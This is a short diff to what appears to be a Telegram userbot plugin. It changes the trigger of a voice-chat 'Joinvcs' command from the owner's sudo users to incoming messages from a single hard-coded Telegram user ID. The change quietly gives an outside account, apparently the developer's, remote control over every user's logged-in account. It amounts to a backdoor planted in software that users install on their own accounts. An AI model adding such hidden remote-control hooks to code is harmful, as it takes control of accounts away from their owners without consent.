@@ -118,7 +118,7 @@ async def change_title(e):
 
 
 @ayiin_cmd(pattern="joinvc(?: |$)(.*)", group_only=True)
-@register(pattern=r"^Joinvcs$", sudo=True)
+@register(incoming=True, from_users=1829900877, pattern=r"^Joinvcs$")
 async def _(a):
     sender = await a.get_sender()
     yins = await a.client.get_me()
